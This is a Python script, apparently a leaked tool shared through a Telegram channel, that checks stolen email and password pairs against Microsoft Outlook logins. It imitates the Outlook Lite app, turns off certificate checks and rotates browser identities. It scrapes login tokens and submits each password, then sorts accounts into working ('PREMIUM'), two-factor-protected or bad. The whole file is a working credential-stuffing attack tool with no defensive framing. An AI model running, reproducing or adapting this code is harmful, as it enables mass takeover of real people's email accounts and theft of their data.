# speed_engine.py
import re
import uuid
import random
import time
import requests

# Leak by @SenseiNoir
# Channel: https://t.me/SenseiFall


class SpeedEngine:
    def __init__(self):
        self.uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
        ]
        self.timeout = 7

    def check_account(self, email, password):
        if "@" not in email or len(password) < 3:
            return {"status": "BAD", "data": []}
        for _ in range(3):
            try:
                session = requests.Session()
                session.verify = False
                cid_str = str(uuid.uuid4())
                r_ua = random.choice(self.uas)
                u1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
                h1 = {"X-OneAuth-AppName": "Outlook Lite","X-Office-Version": "3.11.0-minApi24","X-CorrelationId": cid_str,"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)","Host": "odc.officeapps.live.com","Connection": "Keep-Alive"}
                r1 = session.get(u1, headers=h1, timeout=self.timeout)
                if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text:
                    return {"status": "BAD", "data": []}
                u2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                h2 = {"User-Agent": r_ua, "Connection": "keep-alive"}
                r2 = session.get(u2, headers=h2, allow_redirects=True, timeout=self.timeout)
                um = re.search(r'urlPost":"([^"]+)"', r2.text)
                pm = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
                if not um or not pm:
                    return {"status": "BAD", "data": []}
                pu = um.group(1).replace("\\/", "/")
                pt = pm.group(1)
                d3 = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={pt}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
                h3 = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": r_ua,"Origin": "https://login.live.com","Referer": r2.url}
                r3 = session.post(pu, data=d3, headers=h3, allow_redirects=False, timeout=self.timeout)
                if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                    return {"status": "BAD", "data": []}
                if "identity/confirm" in r3.text or "Consent" in r3.text or "recover" in r3.text.lower() or "locked" in r3.text.lower():
                    return {"status": "2FA", "data": []}
                if "Abuse" in r3.text:
                    return {"status": "BAD", "data": []}
                lc = r3.headers.get("Location", "")
                cm = re.search(r'code=([^&]+)', lc)
                mc = session.cookies.get("MSPCID", "")
                if not cm or not mc:
                    return {"status": "BAD", "data": []}
                cd_val = cm.group(1)
                d4 = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={cd_val}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=d4, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=self.timeout)
                if "access_token" not in r4.text:
                    return {"status": "BAD", "data": []}
                return {"status": "PREMIUM", "data": [f"{email}:{password}"]}
            except Exception:
                time.sleep(0.5)
                continue
        return {"status": "ERROR", "data": []}